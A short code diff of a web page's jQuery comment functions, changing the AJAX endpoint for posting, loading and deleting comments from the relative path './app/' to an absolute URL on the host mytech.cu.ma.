@@ -87,7 +87,7 @@ function runPostComment() {
 		
 	$.ajax({
 		type: "POST",
-		url: "./app/", 
+		url: "https://mytech.cu.ma/app/", 
 		dataType: "json",
 		data: {olaprium: olaprium, auth_ola: auth_ola, commtp: commtp, commentonpost: commentonpost, commenter: commenter, commenterdate:commenterdate, commentry: commentry, },
 		success: function(data){
@@ -117,7 +117,7 @@ function loadallcomments(){
     var ewi4n20jsl = "ewi4n20jsl";
     $.ajax({
 		type: "POST",
-		url: "./app/", 
+		url: "https://mytech.cu.ma/app/", 
 		dataType: "json",
 		data: {olaprium: olaprium, auth_ola: auth_ola, ewi4n20jsl: ewi4n20jsl},
 		success: function(ListResponds){
@@ -210,7 +210,7 @@ function pushcommentDelete(bpnh) {
 	var commentsroid = bpnh;
 	$.ajax({
 		type: "POST",
-		url: "./app/",  
+		url: "https://mytech.cu.ma/app/",  
 		dataType: "json",
 		data: {olaprium: olaprium, auth_ola: auth_ola, commentsroid: commentsroid},
 		success: function(data){
